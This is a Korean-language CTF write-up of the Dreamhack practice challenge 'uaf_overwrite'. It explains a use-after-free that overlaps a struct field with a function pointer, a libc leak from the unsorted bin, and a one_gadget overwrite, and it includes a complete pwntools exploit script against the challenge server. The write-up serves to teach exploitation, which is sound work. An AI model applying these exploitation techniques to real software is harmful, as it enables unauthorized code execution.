---
ctf_name: "Dreamhack-Wargame"
challenge_name: "uaf_overwrite"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"        # easy / medium / hard / insane
author: "khgkhg05"
date: "2026-07-28"
points:
tags: [ELF, x86-64, heap, UAF, ptmalloc2, unsorted-bin, libc-leak, one-gadget]
---

# 문제명

`uaf_overwrite`

## 문제 설명

> Dreamhack `리눅스(Linux) 시스템 해킹 심화` Path의 `Exploit Tech: Use After Free` 실습 문제이다.

- 문제 URL: `https://dreamhack.io/wargame/challenges/357/`
- 문제 파일: `uaf_overwrite`, `uaf_overwrite.c`, `libc-2.27.so`, `Dockerfile`
- 실행 환경: Ubuntu 18.04, glibc 2.27
- 보호 기법: Full RELRO, Canary, NX, PIE

이 문제는 해제된 heap chunk가 다시 할당될 때 기존 데이터가 초기화되지 않고 남는 점을 이용한다. `Human` 객체를 해제한 뒤 같은 크기의 `Robot` 객체로 재할당시키면, `Human.age`에 저장했던 값이 `Robot.fptr` 함수 포인터로 해석된다.

## 풀이

### 분석

소스에는 크기가 같은 두 구조체가 있다.

```c
struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};
```

64-bit 환경에서 두 구조체는 모두 `0x20`바이트이고, `Human.age`와 `Robot.fptr`는 모두 offset `0x18`에 위치한다.

```text
Human.age  = chunk + 0x18
Robot.fptr = chunk + 0x18
```

`human_func()`는 `Human`을 할당한 뒤 `age`를 입력받고 바로 `free()`한다.

```c
human = (struct Human *)malloc(sizeof(struct Human));
...
scanf("%ld", &human->age);
free(human);
```

이후 `robot_func()`는 같은 크기의 `Robot`을 할당한다. glibc 2.27의 tcache는 같은 크기의 해제 chunk를 재사용하므로, 방금 free된 `Human` chunk가 `Robot` chunk로 돌아온다.

```c
robot = (struct Robot *)malloc(sizeof(struct Robot));
...
if (robot->fptr)
  robot->fptr();
else
  robot->fptr = print_name;

robot->fptr(robot);
```

`Robot.fptr`는 할당 직후 초기화되지 않은 상태로 먼저 검사되고 호출된다. 따라서 이전에 `Human.age`에 넣어둔 주소를 함수 포인터로 실행할 수 있다.

### 취약점

최종적으로 `Robot.fptr`에 `one_gadget` 주소를 넣기 위해서는 libc base가 필요하다. `exploit.py`는 `Custom` 메뉴를 이용해 unsorted bin에 남은 libc 포인터를 leak한다.

```python
def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())
```

`custom_func()`는 `size >= 0x100`일 때 chunk를 할당하고 데이터를 출력한 뒤, 입력받은 `idx`의 chunk를 free한다. 여기서 `idx`는 `unsigned int`인데 `scanf("%d", &idx)`로 입력받는다. `-1`을 넣으면 내부 값은 `0xffffffff`가 되고, `idx < 10` 조건을 만족하지 않아 free가 일어나지 않는다.

사용한 heap 배치는 다음과 같다.

```python
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)
custom(0x500, b'B', -1)
```

동작은 다음 순서로 정리할 수 있다.

```text
1. 0x500 chunk A 할당, idx=-1로 free 생략
2. 0x500 chunk B 할당, idx=-1로 free 생략
3. 0x500 chunk C 할당 후 idx=0으로 A free
4. 다시 0x500 chunk를 할당하면 unsorted bin의 A가 재사용됨
5. A에 남아 있던 fd 포인터가 printf("%s")로 출력됨
```

`0x500` 크기는 tcache에 들어가지 않으므로 free된 A chunk는 unsorted bin에 들어간다. 이때 user data 영역에는 `main_arena`를 가리키는 `fd`/`bk` 포인터가 남는다. 마지막 입력 `b'B'`는 이 포인터의 하위 1바이트를 `0x42`로 덮으므로, leak 값에서 `0x3ebc42`를 빼면 libc base가 된다.

```python
lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c
```

제공된 `libc-2.27.so` 기준으로 `0x10a41c` one_gadget을 사용한다.

### 익스플로잇

전체 exploit 흐름은 다음과 같다.

1. `custom()`을 4번 호출해 unsorted bin의 libc 포인터를 출력시킨다.
2. 출력값에서 `0x3ebc42`를 빼 libc base를 계산한다.
3. libc base에 `0x10a41c`를 더해 one_gadget 주소를 구한다.
4. `human(1, og)`로 `Human.age`에 one_gadget 주소를 저장한 뒤 free시킨다.
5. `robot(1)`로 같은 chunk를 `Robot`으로 재할당하고 `Robot.fptr` 호출을 발생시킨다.

최종 exploit 코드는 다음과 같다.

```python
from pwn import *
import sys

p = remote(sys.argv[1], int(sys.argv[2]))

def slog(sym, val): success(sym + ': ' + hex(val))

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())

custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)
custom(0x500, b'B', -1)

lb = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebc42
og = lb + 0x10a41c

slog('libc_base', lb)
slog('one_gadget', og)

human(1, og)
robot(1)

p.interactive()
```

실행은 Dreamhack에서 발급된 접속 정보로 진행한다.

```text
$ python3 exploit.py host3.dreamhack.games <PORT>
[+] libc_base: 0x7f...
[+] one_gadget: 0x7f...
[*] Switching to interactive mode
$ id
```

## 플래그

```text
DH{REDACTED}
```

## 추가 파일

| 파일 | 설명 |
|------|------|
| `Dockerfile` | Ubuntu 18.04 기반 분석 환경 |
| `uaf_overwrite` | 문제 원본 ELF 바이너리 |
| `uaf_overwrite.c` | 문제 원본 C 소스 |
| `libc-2.27.so` | 문제에서 제공된 glibc 2.27 |
| `exploit.py` | 사용자가 작성한 Dreamhack 원격 서비스용 exploit |

## 배운 점

UAF는 free된 포인터를 단순히 다시 읽는 버그가 아니라, allocator가 같은 크기의 chunk를 재사용하는 방식과 결합될 때 함수 포인터 제어로 이어질 수 있다. 이 문제에서는 `Human.age`와 `Robot.fptr`가 같은 offset에 있기 때문에, 한 타입의 데이터가 다른 타입의 함수 포인터로 재해석된다.

또한 Full RELRO, NX, PIE가 모두 켜져 있어도 unsorted bin metadata leak으로 libc base를 얻으면 ASLR을 우회할 수 있다. leak으로 계산한 one_gadget 주소를 UAF로 함수 포인터에 넣는 것이 이 문제의 핵심이다.
